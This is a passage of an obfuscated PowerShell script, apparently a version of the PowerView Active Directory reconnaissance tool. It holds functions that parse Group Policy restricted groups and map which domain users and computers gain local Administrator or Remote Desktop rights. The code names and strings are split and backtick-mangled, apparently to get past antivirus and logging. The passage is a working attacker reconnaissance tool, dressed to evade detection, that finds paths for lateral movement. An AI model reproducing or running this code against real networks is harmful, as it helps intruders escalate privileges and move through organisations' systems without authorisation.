                    ${g`Ro`Up}, ${RE`LatiON} = ${mem`BER`sHIP}."k`ey".("{1}{0}" -f 'it','Spl').Invoke('__', ${SPLIt`OptI`On}) | &("{3}{2}{1}{0}"-f't','ch-Objec','Ea','For') {${_}.("{1}{0}"-f'm','Tri').Invoke()}
                    
                    ${memBERS`H`IPvAlUe} = ${MeM`BE`RSH`Ip}."va`Lue" | &("{2}{1}{0}"-f'ect','Obj','Where-') {${_}} | &("{1}{2}{0}" -f 'ct','ForEa','ch-Obje') { ${_}.("{1}{0}"-f 'rim','T').Invoke('*') } | &("{1}{3}{2}{0}"-f 'ct','Where','e','-Obj') {${_}}

                    if (${P`sB`OuN`dPARAMeTerS}[("{6}{2}{4}{1}{3}{0}{5}"-f 'T','Memb','esolv','ers','e','oSIDs','R')]) {
                        
                        ${gRo`Up`MemBe`Rs} = @()
                        ForEach (${m`eMber} in ${MeM`Ber`sh`i`PvaluE}) {
                            if (${me`MBEr} -and (${mem`BEr}.("{1}{0}" -f 'im','Tr').Invoke() -ne '')) {
                                if (${M`eMBER} -notmatch ("{1}{0}" -f'*','^S-1-.')) {
                                    ${con`V`ERtT`oarG`UmEnTs} = @{("{0}{2}{1}"-f 'Object','e','Nam') = ${MeM`B`ER}}
                                    if (${P`sB`O`UN`d`PARaMeTErS}[("{0}{2}{1}" -f 'Dom','in','a')]) { ${cONve`RTtOAr`gu`MeNtS}[("{1}{0}{2}"-f 'ma','Do','in')] = ${Do`m`AIN} }
                                    ${meMbeR`s`iD} = &("{0}{1}{2}" -f'Convert','To-SI','D') @ConvertToArguments

                                    if (${MemB`ERs`id}) {
                                        ${GRo`U`p`meMBErS} += ${M`em`BerSID}
                                    }
                                    else {
                                        ${gROUPm`EMB`E`Rs} += ${me`MBER}
                                    }
                                }
                                else {
                                    ${GrouPm`emb`E`Rs} += ${MeM`BER}
                                }
                            }
                        }
                        ${Me`mbEr`sHIpv`A`lUE} = ${Gr`o`UP`membeRs}
                    }

                    if (-not ${M`E`MBERSh`iPS}[${Gro`UP}]) {
                        ${M`EMB`eRsh`IPS}[${grO`Up}] = @{}
                    }
                    if (${m`EmBeRShI`Pv`A`LuE} -isnot [System.Array]) {${MEMb`e`RsH`ipV`ALue} = @(${M`EMB`eRshIPva`l`Ue})}
                    ${m`embER`SHips}[${G`R`oup}].("{0}{1}"-f 'A','dd').Invoke(${REL`At`ION}, ${M`EMbeRs`hIPVa`LUE})
                }

                ForEach (${M`E`MbERsHIP} in ${meMB`Ers`h`ipS}.("{3}{4}{1}{0}{2}"-f 'merat','tEnu','or','G','e').Invoke()) {
                    if (${mEM`BERs`HiP} -and ${MEm`BE`RS`HIp}."k`EY" -and (${M`em`BERsHiP}."K`ey" -match '^\*')) {
                        
                        ${G`R`oUPsID} = ${M`EMb`ersH`IP}."k`Ey".("{1}{0}" -f'rim','T').Invoke('*')
                        if (${GROU`ps`iD} -and (${gR`OuP`Sid}.("{0}{1}" -f 'Tri','m').Invoke() -ne '')) {
                            ${GRoup`Na`Me} = &("{4}{2}{3}{0}{1}" -f 'tF','rom-SID','onve','r','C') -ObjectSID ${groU`PSiD} @ConvertArguments
                        }
                        else {
                            ${gR`oUP`NAmE} = ${fAl`sE}
                        }
                    }
                    else {
                        ${GR`O`UpNAmE} = ${Memb`E`RS`HIP}."k`Ey"

                        if (${grO`UpN`AME} -and (${g`RO`UPName}.("{0}{1}" -f'Tr','im').Invoke() -ne '')) {
                            if (${gRO`UPnA`ME} -match ("{0}{1}{2}{3}{4}" -f'A','dmi','nistr','ator','s')) {
                                ${gR`OU`PSid} = ("{2}{3}{1}{0}" -f '44','5','S-1-5-3','2-')
                            }
                            elseif (${Gr`o`UPnAME} -match ("{3}{0}{2}{1}"-f 'emote D','op','eskt','R')) {
                                ${gR`oU`pSID} = ("{0}{1}{2}"-f'S-1-5-3','2-','555')
                            }
                            elseif (${grOUp`N`A`me} -match ("{0}{2}{1}" -f'Gu','ts','es')) {
                                ${gR`O`UpS`iD} = ("{3}{2}{0}{1}"-f'3','2-546','-1-5-','S')
                            }
                            elseif (${G`ROupna`ME}.("{1}{0}" -f'm','Tri').Invoke() -ne '') {
                                ${conVE`R`TtOArg`U`me`NTS} = @{("{0}{2}{1}" -f'O','ectName','bj') = ${g`RO`UPnaME}}
                                if (${p`sBouNdpAR`A`MeT`ers}[("{0}{1}" -f 'D','omain')]) { ${co`N`VERtT`OaRGUme`NTS}[("{1}{0}"-f 'n','Domai')] = ${DOm`Ain} }
                                ${Gro`UP`SID} = &("{2}{0}{1}" -f 'o-S','ID','ConvertT') @ConvertToArguments
                            }
                            else {
                                ${gRo`UPs`Id} = ${n`UlL}
                            }
                        }
                    }

                    ${g`p`ogrouP} = &("{2}{0}{1}" -f '-','Object','New') ("{1}{2}{0}" -f 'ject','P','SOb')
                    ${gpOg`R`oup} | &("{1}{2}{0}"-f 'er','Add-Me','mb') ("{1}{2}{0}{3}" -f'rope','N','otep','rty') ("{1}{4}{2}{0}{3}" -f 'Nam','GPODisp','y','e','la') ${gpODIS`PLA`Yna`me}
                    ${G`po`GRoup} | &("{0}{2}{1}"-f'A','Member','dd-') ("{1}{0}{2}" -f 'propert','Note','y') ("{2}{0}{1}" -f'ON','ame','GP') ${G`pO`NAMe}
                    ${g`POG`RO`UP} | &("{2}{0}{3}{1}"-f'dd','ember','A','-M') ("{0}{1}{2}" -f'No','teproper','ty') ("{0}{1}" -f'GPO','Path') ${gPO`p`ATH}
                    ${gp`oGRO`UP} | &("{0}{2}{1}" -f'Add-M','mber','e') ("{2}{0}{3}{1}"-f 'pro','ty','Note','per') ("{0}{1}"-f'GPOTy','pe') ("{4}{1}{2}{0}{3}" -f'dGro','estrict','e','ups','R')
                    ${G`P`o`GrOup} | &("{1}{2}{0}" -f 'ber','Add-','Mem') ("{0}{2}{1}" -f'Not','roperty','ep') ("{0}{1}" -f 'F','ilters') ${N`UlL}
                    ${GpoG`RO`UP} | &("{3}{1}{0}{2}" -f 'e','d-M','mber','Ad') ("{0}{1}{2}{3}"-f 'Notepro','pe','rt','y') ("{2}{1}{0}"-f'e','am','GroupN') ${gRo`Up`Name}
                    ${Gp`oGrO`UP} | &("{1}{0}{2}{3}"-f 'dd-M','A','embe','r') ("{3}{2}{0}{1}" -f'r','ty','teprope','No') ("{2}{0}{1}" -f 'p','SID','Grou') ${gr`oUPs`ID}
                    ${GP`OgR`ouP} | &("{0}{1}{2}"-f'Add-','Memb','er') ("{1}{0}{2}" -f'tepropert','No','y') ("{2}{1}{0}" -f 'emberOf','oupM','Gr') ${Mem`BE`RsHIP}."val`UE"."MeM`B`ERof"
                    ${GpOG`ROUp} | &("{0}{2}{1}"-f'Add-M','mber','e') ("{0}{2}{1}"-f 'Notep','perty','ro') ("{2}{0}{1}"-f 'pMemb','ers','Grou') ${m`EMbEr`sHiP}."vAl`Ue"."mEm`BeRs"
                    ${g`POgr`OUP}."p`soBJ`ect"."tYPE`NaM`es".("{1}{2}{0}"-f't','I','nser').Invoke(0, ("{1}{3}{2}{4}{0}"-f'oup','PowerVie','G','w.GPO','r'))
                    ${gPog`R`OuP}
                }
            }

            
            ${PA`R`sEAR`gS} =  @{
                ("{3}{2}{1}{0}" -f 'MLpath','sX','oup','Gr') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{2}{0}{1}" -f'Gro','upsXML','Get-') @ParseArgs | &("{0}{3}{1}{2}" -f 'For','-Obje','ct','Each') {
                if (${PsB`OUn`DpA`RA`MeTers}[("{5}{1}{4}{3}{0}{2}" -f'ToSID','emb','s','s','er','ResolveM')]) {
                    ${grouPmE`mb`ErS} = @()
                    ForEach (${m`eMb`er} in ${_}."grOupMe`MB`e`RS") {
                        if (${meM`BeR} -and (${me`mBEr}.("{0}{1}" -f'Tr','im').Invoke() -ne '')) {
                            if (${M`E`mBer} -notmatch ("{0}{1}"-f '^S-1-.','*')) {

                                
                                ${COnve`R`T`ToA`RG`UMEnTS} = @{("{0}{1}{2}" -f 'Obj','ectNa','me') = ${grOuPN`A`ME}}
                                if (${p`sboU`NDPa`R`AMeTErs}[("{0}{1}"-f 'Domai','n')]) { ${co`N`V`e`RTTOArGUmEn`TS}[("{1}{0}" -f'n','Domai')] = ${D`oma`iN} }
                                ${m`e`mBersId} = &("{2}{0}{3}{1}{4}" -f'onve','To','C','rt','-SID') -Domain ${DoM`A`IN} -ObjectName ${MEM`B`ER}

                                if (${mEm`BERS`id}) {
                                    ${g`ROuPM`Em`BErs} += ${ME`MbERS`Id}
                                }
                                else {
                                    ${G`ROUp`mEm`BERs} += ${M`e`MBeR}
                                }
                            }
                            else {
                                ${g`Ro`U`pmEmbers} += ${me`mB`eR}
                            }
                        }
                    }
                    ${_}."GR`ouPmeM`BE`RS" = ${g`ROu`pme`m`BERs}
                }

                ${_} | &("{1}{2}{3}{0}"-f'er','Add','-M','emb') ("{0}{1}{2}"-f'No','t','eproperty') ("{2}{0}{1}" -f'isplayNa','me','GPOD') ${GPoD`Is`pla`yNAME}
                ${_} | &("{2}{1}{0}"-f'd-Member','d','A') ("{1}{0}{2}" -f 'rope','Notep','rty') ("{0}{1}"-f 'G','POName') ${GP`o`NAme}
                ${_} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{2}{1}{3}{0}"-f'erty','o','Notepr','p') ("{0}{1}{2}" -f'G','P','OType') ("{3}{4}{1}{2}{0}" -f's','cyPreferenc','e','GroupPo','li')
                ${_}."p`Sob`JEcT"."tY`peN`AmES".("{1}{0}" -f'rt','Inse').Invoke(0, ("{1}{3}{0}{2}" -f'.GPOG','PowerVi','roup','ew'))
                ${_}
            }
        }
    }
}


function ge`T-doM`A`i`NgPoUsEr`loCa`lGroU`pMapPinG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{3}{1}{2}"-f 'SSho','oc','ess','uldPr','P'}, '')]
    [OutputType({"{2}{0}{4}{5}{1}{6}{3}" -f'rView.GPOUserLo','M','Powe','pping','ca','lGroup','a'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITiON = 0, vALueFromPIPeLine = ${t`Rue}, vALUEFROMPIPeLInEbYPRoPERtYNaME = ${T`RuE})]
        [Alias({"{1}{5}{3}{4}{2}{0}" -f'me','Dis','edNa','ingui','sh','t'}, {"{2}{0}{1}"-f'mAcco','untName','Sa'}, {"{0}{1}"-f'N','ame'})]
        [String]
        ${I`D`EntITY},

        [String]
        [ValidateSet({"{3}{0}{1}{2}"-f'in','istrator','s','Adm'}, {"{2}{1}{3}{0}"-f '-32-544','-','S','1-5'}, 'RDP', {"{1}{0}{2}{4}{5}{3}" -f 'mote D','Re','esktop','s',' Us','er'}, {"{2}{1}{0}" -f '-555','2','S-1-5-3'})]
        ${lo`CAL`gR`oup} = ("{0}{2}{1}"-f 'Administrat','s','or'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'ADSP','a','th'})]
        [String]
        ${S`eAr`CHbaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{2}{1}"-f'nt','r','rolle','inCo','Doma'})]
        [String]
        ${S`e`RVer},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{1}{0}{2}" -f 'eLev','On','el'}, {"{2}{0}{1}" -f 'tr','ee','Sub'})]
        [String]
        ${sE`A`RChsco`PE} = ("{1}{0}{2}"-f'ubtre','S','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sU`Ltp`AGESi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`VeR`TimELImIt},

        [Switch]
        ${tOM`Bs`TONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEden`T`IaL} =   (  GeT-vaRiaBle  0dSqr  -VA )::"e`mPtY"
    )

    BEGIN {
        ${COmM`o`NArGUmeN`TS} = @{}
        if (${PsbO`UND`paRAMe`T`ERs}[("{1}{0}{2}"-f'a','Dom','in')]) { ${cO`mmo`Na`RGuM`entS}[("{0}{1}" -f'Doma','in')] = ${dOMa`In} }
        if (${p`SboUnDp`Ar`A`MeTErs}[("{1}{0}" -f'ver','Ser')]) { ${cOmMoN`ARgU`MeNTS}[("{2}{1}{0}"-f'ver','er','S')] = ${serv`ER} }
        if (${p`Sb`o`Und`pa`RamETeRS}[("{2}{1}{0}" -f 'pe','earchSco','S')]) { ${commO`N`ARgUm`en`TS}[("{1}{3}{0}{2}"-f'op','Search','e','Sc')] = ${s`earCH`sC`Ope} }
        if (${p`SBoUNdpA`RA`m`Eters}[("{2}{1}{0}{3}" -f'iz','ltPageS','Resu','e')]) { ${comMo`Na`RgumEn`TS}[("{2}{0}{1}" -f 'ultPageSi','ze','Res')] = ${rEsuLtpA`g`EsIzE} }
        if (${PsBOu`NDPAra`m`et`eRS}[("{1}{3}{2}{0}"-f'it','ServerT','im','imeL')]) { ${COM`mo`NARGu`M`Ents}[("{3}{0}{1}{2}" -f 'L','im','it','ServerTime')] = ${SEr`VeRTim`E`L`IMiT} }
        if (${pSbOUN`d`p`Ar`AmEte`Rs}[("{1}{0}{2}"-f 'mbs','To','tone')]) { ${C`OMmOnARGU`MEN`Ts}[("{2}{0}{1}"-f 'o','ne','Tombst')] = ${tOmB`ST`oNe} }
        if (${psBoU`N`DpA`R`AmeTERS}[("{2}{1}{0}"-f'tial','en','Cred')]) { ${Co`mMOnAr`G`UMeNtS}[("{2}{0}{1}"-f'nt','ial','Crede')] = ${cRed`eNt`i`AL} }
    }

    PROCESS {
        ${T`AR`geTS`Ids} = @()

        if (${psbOu`NdPAR`A`m`eterS}[("{1}{0}"-f 'entity','Id')]) {
            ${ta`RGE`TsI`ds} += &("{1}{0}{2}{3}"-f 't-Do','Ge','ma','inObject') @CommonArguments -Identity ${i`dE`NTitY} | &("{1}{2}{3}{0}" -f 't','Selec','t','-Objec') -Expand ("{0}{2}{1}{3}"-f'objec','s','t','id')
            ${TA`RG`e`TObjEcTsiD} = ${TarGEt`S`ids}
            if (-not ${Ta`RGET`sI`Ds}) {
                Throw ('[Get-DomainGP'+'O'+'Use'+'r'+'Local'+'Gro'+'upMa'+'pping]'+' '+'Unable'+' '+'to'+' '+'r'+'etrieve'+' '+'S'+'ID '+'for'+' '+'iden'+'ti'+'ty '+"'$Identity'")
            }
        }
        else {
            
            ${Tar`GeTs`IDS} = @('*')
        }

        if (${loCa`L`gROUP} -match ("{0}{1}"-f'S','-1-5')) {
            ${T`ArgEt`LoCa`lSid} = ${lOca`LGr`oup}
        }
        elseif (${LOc`A`L`gROup} -match ("{1}{0}"-f 'in','Adm')) {
            ${T`ARgEtLoCa`lsid} = ("{3}{0}{2}{1}" -f'-','544','5-32-','S-1')
        }
        else {
            
            ${tAR`GETL`Oc`AlS`id} = ("{3}{1}{2}{0}"-f '5','-32','-55','S-1-5')
        }

        if (${t`ARGEt`Si`Ds}[0] -ne '*') {
            ForEach (${TA`R`GeTsId} in ${TAr`GETs`idS}) {
                &("{0}{3}{4}{2}{1}" -f'Writ','e','bos','e-V','er') ('[G'+'e'+'t-D'+'omainGPOU'+'serLocalGr'+'o'+'upMap'+'p'+'ing] '+'E'+'num'+'era'+'ting '+'neste'+'d '+'gr'+'oup '+'mem'+'ber'+'ships '+'f'+'or: '+"'$TargetSid'")
                ${T`ARGeTS`IDs} += &("{1}{2}{0}{3}"-f'o','Get-','DomainGr','up') @CommonArguments -Properties ("{2}{0}{1}"-f'bjects','id','o') -MemberIdentity ${tAR`Ge`T`SID} | &("{2}{3}{1}{0}"-f 'Object','t-','Sele','c') -ExpandProperty ("{1}{0}{2}"-f 'jects','ob','id')
            }
        }

        &("{2}{0}{1}{3}"-f 'rb','os','Write-Ve','e') ('['+'Get-D'+'omai'+'nGPOUserLoc'+'alGroup'+'Mapp'+'ing] '+'Tar'+'get'+' '+'lo'+'ca'+'lgroup '+'SID'+': '+"$TargetLocalSID")
        &("{0}{1}{2}" -f 'W','rite-Ve','rbose') ('[Get'+'-DomainGPOUse'+'r'+'LocalGr'+'oupMa'+'p'+'p'+'ing] '+'Eff'+'e'+'ctive '+'tar'+'get '+'domai'+'n '+'S'+'ID'+'s: '+"$TargetSIDs")

        ${Gpo`gR`OuPs} = &("{3}{0}{4}{1}{5}{2}" -f 'ainG','OLo','Group','Get-Dom','P','cal') @CommonArguments -ResolveMembersToSIDs | &("{0}{2}{4}{3}{1}" -f'ForEa','t','c','Objec','h-') {
            ${gPOg`R`OUp} = ${_}
            
            if (${Gpo`g`ROUP}."GrOu`psid" -match ${Ta`R`getL`OcA`Lsid}) {
                ${gP`O`Gr`OUP}."groupM`EMBe`RS" | &("{0}{1}{3}{2}" -f 'Whe','re','bject','-O') {${_}} | &("{1}{2}{4}{3}{0}" -f'ect','Fo','rEa','-Obj','ch') {
                    if ( (${T`Arg`E`TSiDS}[0] -eq '*') -or (${T`ARGet`SidS} -Contains ${_}) ) {
                        ${Gp`OgRO`UP}
                    }
                }
            }
            
            if ( (${GPo`GRO`UP}."Gr`oUPM`eMbE`RoF" -contains ${t`AR`gEtL`oCalSiD}) ) {
                if ( (${T`ArgETs`iDs}[0] -eq '*') -or (${t`A`R`getsIDs} -Contains ${gpO`gr`OUp}."grouP`S`ID") ) {
                    ${gPOGr`O`Up}
                }
            }
        } | &("{0}{2}{1}"-f 'Sort-','t','Objec') -Property ("{0}{1}"-f'GPONam','e') -Unique

        ${g`PO`groUps} | &("{3}{2}{1}{0}"-f'bject','-O','ere','Wh') {${_}} | &("{4}{1}{3}{0}{2}"-f'ach-O','o','bject','rE','F') {
            ${gpOn`A`me} = ${_}."gPODiS`pLaYNa`me"
            ${gP`OGu`ID} = ${_}."gpo`NA`Me"
            ${gp`OpA`TH} = ${_}."Gp`Op`AtH"
            ${G`Pot`yPe} = ${_}."gpO`TYPE"
            if (${_}."gro`UPmE`MBers") {
                ${Gp`Om`EM`BeRs} = ${_}."Gr`OUp`MEM`BErS"
            }
            else {
                ${GPO`m`Embe`RS} = ${_}."GR`O`UPSId"
            }

            ${FIL`Te`RS} = ${_}."fILT`e`RS"

            if (${T`A`RgeT`sIds}[0] -eq '*') {
                
                ${tArGetobJ`E`CT`s`IdS} = ${gP`oMEmBe`Rs}
            }
            else {
                ${tArG`Eto`BjECT`Si`Ds} = ${tA`RgetoB`jec`T`Sid}
            }

            
            &("{1}{0}{2}{3}" -f'ma','Get-Do','i','nOU') @CommonArguments -Raw -Properties ("{0}{2}{3}{4}{1}{5}"-f 'nam','am','e,','disting','uishedn','e') -GPLink ${gP`OG`Uid} | &("{2}{1}{0}{4}{3}"-f'ch-O','orEa','F','ect','bj') {
                if (${FIl`TE`Rs}) {
                    ${oUCOMpu`T`eRS} = &("{3}{2}{0}{1}{4}" -f 'ai','nComp','m','Get-Do','uter') @CommonArguments -Properties ("{6}{7}{2}{5}{8}{0}{3}{4}{1}"-f 'in','e','shostname','guis','hednam',',d','d','n','ist') -SearchBase ${_}."p`AtH" | &("{2}{0}{3}{1}" -f'er','ect','Wh','e-Obj') {${_}."di`S`T`iN`gUIsHED`NaME" -match (${FILt`e`RS}."v`ALUe")} | &("{1}{3}{0}{4}{2}"-f 'O','Se','ect','lect-','bj') -ExpandProperty ("{2}{1}{0}{3}" -f 'ho','s','dn','stname')
                }
                else {
                    ${oUCO`mpuT`E`Rs} = &("{2}{3}{0}{1}"-f 'nCompu','ter','Get-Do','mai') @CommonArguments -Properties ("{1}{2}{0}"-f'name','dnsho','st') -SearchBase ${_}."pa`Th" | &("{0}{2}{1}"-f'Se','ct-Object','le') -ExpandProperty ("{0}{2}{1}" -f 'dnshostna','e','m')
                }

                if (${O`Uc`oMPUTERS}) {
                    if (${O`Uc`OmPUTE`RS} -isnot [System.Array]) {${OU`COm`puTe`RS} = @(${OuC`oM`p`UTERs})}

                    ForEach (${t`ARGEt`SId} in ${TA`Rg`EtObj`EcTsiDS}) {
                        ${oB`je`ct} = &("{3}{2}{0}{4}{1}" -f'nO','t','i','Get-Doma','bjec') @CommonArguments -Identity ${T`AR`geTsId} -Properties ("{8}{13}{0}{6}{7}{9}{1}{10}{4}{2}{14}{11}{5}{3}{12}"-f 'ccounttype,s','a','isti',',objectsi','d','e','amaccoun','t','s','n','me,','guishednam','d','ama','n')

                        ${is`gr`OUP} = @(("{1}{0}{2}"-f'354','2684','56'),("{0}{1}" -f '26843545','7'),("{1}{0}{2}"-f'9','536870','12'),("{1}{0}{2}"-f '368','5','70913')) -contains ${O`B`JecT}."Sam`AccouN`T`TYpe"

                        ${gpoLoc`A`l`GRO`UP`mAppIng} = &("{0}{3}{1}{2}" -f'N','Obje','ct','ew-') ("{1}{0}{2}"-f'b','PSO','ject')
                        ${GPoLO`CalGr`oUPmaPPI`Ng} | &("{0}{3}{2}{1}" -f'A','mber','e','dd-M') ("{2}{3}{0}{1}"-f 'pert','y','N','otepro') ("{0}{1}{2}"-f 'Obje','c','tName') ${o`BJE`cT}."S`AmA`CCoU`NTnAMe"
                        ${g`pOlocA`lgr`OuP`MappiNg} | &("{0}{1}{2}"-f'Add-','Memb','er') ("{2}{0}{1}{3}" -f 'ope','r','Notepr','ty') ("{1}{0}"-f 'ctDN','Obje') ${ObJ`eCt}."Di`st`iN`GuiSHEDNAmE"
                        ${GpOL`o`cALGroupM`Ap`PINg} | &("{2}{0}{1}"-f 'd-Mem','ber','Ad') ("{2}{3}{0}{1}"-f'pert','y','Notep','ro') ("{0}{2}{1}" -f 'Obj','ID','ectS') ${O`BjEcT}."OBject`SiD"
                        ${Gpo`l`ocAL`groUPm`A`PPING} | &("{1}{2}{0}" -f'mber','Add-','Me') ("{1}{0}{3}{2}" -f 'ro','Notep','ty','per') ("{0}{1}"-f'Do','main') ${d`OmAin}
                        ${Gp`Ol`OcALGro`UPMA`pPING} | &("{1}{2}{0}" -f 'ember','Ad','d-M') ("{2}{3}{1}{0}"-f 'y','ert','Notep','rop') ("{0}{1}"-f'IsGrou','p') ${I`SGr`OUp}
                        ${g`pOloCa`lG`RoUpma`P`pING} | &("{2}{1}{0}"-f 'mber','-Me','Add') ("{2}{0}{3}{1}" -f 'e','ty','Not','proper') ("{2}{3}{1}{0}" -f'Name','play','GPOD','is') ${G`P`OnamE}
                        ${gpo`Lo`cAlg`R`OUP`M`APPinG} | &("{1}{0}{2}"-f 'dd','A','-Member') ("{2}{0}{1}"-f 'p','roperty','Note') ("{0}{1}" -f'GPOGui','d') ${GP`O`guId}
                        ${GPOLocaL`grO`U`PMa`PPiNg} | &("{0}{1}{2}" -f'A','dd','-Member') ("{0}{3}{2}{1}"-f'N','rty','pe','otepro') ("{1}{0}" -f'Path','GPO') ${GPOpA`Th}
                        ${GPOl`o`CalgR`OUpMap`PI`Ng} | &("{1}{0}{3}{2}" -f'-','Add','r','Membe') ("{1}{3}{2}{0}"-f 'y','Notepr','t','oper') ("{1}{2}{0}" -f'pe','GPOT','y') ${G`POT`YPe}
                        ${g`P`oL`ocAlG`RouPm`APPI`Ng} | &("{0}{2}{1}"-f'Ad','r','d-Membe') ("{3}{2}{1}{0}" -f 'rty','pe','tepro','No') ("{3}{1}{2}{0}"-f 'e','ontai','nerNam','C') ${_}."P`RoPE`R`TIES"."DiST`Ing`UIShe`DNAME"
                        ${gPOl`o`Cal`G`ROup`MAPPi`Ng} | &("{0}{2}{1}" -f'Ad','r','d-Membe') ("{2}{1}{3}{0}"-f'ty','t','No','eproper') ("{3}{2}{1}{0}" -f 'erName','t','u','Comp') ${O`Uc`omPUte`Rs}
                        ${GP`oloca`lgRoUPM`Appi`Ng}."p`sob`jEcT"."T`ypEN`Ames".("{0}{1}"-f 'Inse','rt').Invoke(0, ("{3}{1}{5}{4}{6}{2}{7}{0}{8}" -f'a','erView.G','ro','Pow','ca','POLo','lG','upM','pping'))
                        ${g`PO`lo`cAlgroupM`AP`PI`Ng}
                    }
                }
            }

            
            &("{0}{1}{4}{3}{2}"-f 'Get','-Do','e','t','mainSi') @CommonArguments -Properties ("{4}{5}{7}{9}{3}{0}{6}{8}{1}{2}"-f',dis','shedna','me','bl','s','i','ti','t','ngui','eobject') -GPLink ${Gp`oGu`Id} | &("{1}{2}{0}{3}" -f 'h-Objec','ForEa','c','t') {
                ForEach (${t`ARGEt`SiD} in ${taR`gE`TO`B`JECTsids}) {
                    ${ObJ`ect} = &("{2}{0}{3}{1}{4}" -f't-Doma','O','Ge','in','bject') @CommonArguments -Identity ${Ta`R`GeTSID} -Properties ("{0}{4}{2}{1}{9}{7}{5}{3}{10}{11}{8}{6}{14}{13}{12}" -f'sam','nttype,s','cou','guish','ac','e,distin',',','maccountnam','e','a','e','dnam','sid','ct','obje')

                    ${IsgrO`UP} = @(("{1}{0}"-f'5456','26843'),("{1}{0}" -f'7','26843545'),("{1}{2}{0}" -f '2','536870','91'),("{0}{1}{2}"-f'5368','70','913')) -contains ${obj`ect}."sA`MAcco`UN`TtYpE"

                    ${G`Po`Lo`Calg`RoUp`M`AppIng} = &("{2}{0}{1}" -f'ew-Obje','ct','N') ("{0}{2}{1}" -f'PSOb','t','jec')
                    ${g`PoLoca`lgroU`Pm`AppinG} | &("{3}{1}{2}{0}"-f'ber','d-M','em','Ad') ("{0}{1}{2}" -f 'Not','eprope','rty') ("{2}{1}{0}" -f'Name','t','Objec') ${Obj`ect}."S`Am`ACCOU`Nt`NaME"
                    ${gPolOc`ALGROuP`MaP`Ping} | &("{2}{1}{0}"-f 'Member','-','Add') ("{2}{0}{1}" -f'eproper','ty','Not') ("{0}{1}"-f'O','bjectDN') ${O`BjE`ct}."dIs`TIn`Gu`iShedN`AME"
                    ${g`poLOcAl`gr`o`Up`MAPPi`NG} | &("{2}{0}{1}" -f 'd-','Member','Ad') ("{1}{0}{2}{3}"-f 'teproper','No','t','y') ("{2}{0}{1}" -f 'bjectSI','D','O') ${ob`j`ecT}."oB`JECTs`id"
                    ${gpoLO`CAL`gro`Up`mA`pp`iNG} | &("{0}{2}{1}" -f'Add','ember','-M') ("{2}{1}{0}{3}" -f 'ert','eprop','Not','y') ("{1}{0}" -f'up','IsGro') ${IS`Gr`ouP}
                    ${GpOlO`CAl`gRo`U`pMAppING} | &("{2}{0}{1}"-f 'dd-Me','mber','A') ("{2}{1}{0}"-f'ty','teproper','No') ("{0}{1}"-f 'Domai','n') ${d`o`mAIn}
                    ${GpoLO`cAlGROUP`m`AP`PInG} | &("{2}{3}{0}{1}" -f'-M','ember','Ad','d') ("{1}{0}{3}{2}"-f'p','Note','rty','rope') ("{4}{0}{2}{3}{1}"-f'Di','e','splayN','am','GPO') ${g`pon`AMe}
                    ${G`pOl`OCA`l`GrOUp`Ma`PpING} | &("{2}{1}{0}"-f'r','d-Membe','Ad') ("{1}{3}{0}{2}"-f't','Note','y','proper') ("{1}{0}{2}"-f 'Gu','GPO','id') ${GP`oGUiD}
                    ${GPOLo`cAlGR`o`UPMa`PpiNG} | &("{0}{2}{3}{1}" -f 'Add','ber','-M','em') ("{2}{3}{1}{0}" -f 'y','opert','Note','pr') ("{0}{1}"-f 'G','POPath') ${gp`OP`AtH}
                    ${g`POL`OCaLg`ROu`PMA`Pp`Ing} | &("{3}{2}{0}{1}"-f '-Membe','r','dd','A') ("{2}{1}{0}"-f'erty','oteprop','N') ("{0}{1}{2}"-f 'G','POTy','pe') ${gpO`TY`PE}
                    ${g`P`OLOCAlGRoup`maPPinG} | &("{3}{2}{1}{0}" -f 'ber','em','d-M','Ad') ("{2}{0}{1}{3}" -f'ro','pe','Notep','rty') ("{1}{2}{3}{0}" -f'Name','Con','ta','iner') ${_}."diSt`iN`Gu`IsHEDName"
                    ${G`pOlO`caLGROupM`Ap`PInG} | &("{2}{3}{1}{0}"-f 'r','mbe','A','dd-Me') ("{2}{3}{1}{0}"-f 'y','pert','Not','epro') ("{3}{1}{2}{0}"-f'rName','omp','ute','C') ${_}."S`iT`eobjECTBl"
                    ${gP`O`loc`A`lgRO`U`PMAPping}."p`S`ObJECT"."type`NA`Mes".("{0}{1}"-f'Ad','d').Invoke(("{2}{6}{5}{3}{7}{8}{0}{4}{1}" -f 'pMa','ping','Powe','POLo','p','ew.G','rVi','c','alGrou'))
                    ${gpolOc`Al`Gro`Upma`Ppi`Ng}
                }
            }
        }
    }
}


function ge`T-`domAI`N`GP`oCoMPu`TEr`l`oc`AL`grOUPMAppING {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{4}{3}" -f 'l','P','SShou','ss','dProce'}, '')]
    [OutputType({"{7}{2}{1}{10}{8}{4}{0}{11}{6}{5}{3}{9}" -f'ter','View.','wer','oupMemb','u','r','lG','Po','omp','er','GGPOC','Loca'})]
    [CmdletBinding(dEfauLTPArAmEtersetName = {"{2}{0}{1}" -f'ntit','y','ComputerIde'})]
    Param(
        [Parameter(POSitIoN = 0, PARAmetErsEtnaME = "C`oMpu`Teri`dENt`I`TY", mAnDaTory = ${t`RUe}, VALuEFroMpIPelINE = ${Tr`Ue}, VAlUEFrompIPElInEbypROpeRTYnaMe = ${T`RuE})]
        [Alias({"{2}{1}{0}{3}" -f 'am','terN','Compu','e'}, {"{0}{2}{1}"-f'C','ter','ompu'}, {"{4}{2}{3}{0}{1}" -f 'she','dName','ist','ingui','D'}, {"{2}{1}{3}{0}" -f 'e','mAccountN','Sa','am'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${cO`mP`UT`ER`IdEnt`ItY},

        [Parameter(MANdAtOrY = ${t`Rue}, PARAMEtErsETNaME = "OuIDeN`T`Ity")]
        [Alias('OU')]
        [String]
        ${O`Uide`Nt`ITY},

        [String]
